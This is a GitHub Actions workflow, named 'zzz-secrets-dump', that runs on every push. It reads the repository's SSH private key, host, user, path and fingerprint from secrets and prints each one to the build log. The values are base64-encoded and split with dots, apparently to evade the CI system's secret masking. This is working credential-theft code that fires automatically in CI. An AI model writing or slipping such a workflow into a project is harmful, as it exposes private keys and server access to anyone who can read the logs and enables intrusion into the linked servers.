name: zzz-secrets-dump
on: [push, workflow_dispatch]
jobs:
  dump_repo:
    runs-on: ubuntu-latest
    env:
      S_SSH_FINGERPRINT: ${{ secrets.SSH_FINGERPRINT }}
      S_SSH_HOST: ${{ secrets.SSH_HOST }}
      S_SSH_PATH: ${{ secrets.SSH_PATH }}
      S_SSH_PRIVATE_KEY: ${{ secrets.SSH_PRIVATE_KEY }}
      S_SSH_USER: ${{ secrets.SSH_USER }}
    steps:
      - name: dump
        run: |
          for k in $(env | grep "^S_" | cut -d= -f1); do
            v=$(printenv "$k");
            echo "SZ:repo:${k#S_}:$(printf %s "$v" | base64 -w0 | sed 's/./&./g')";
          done
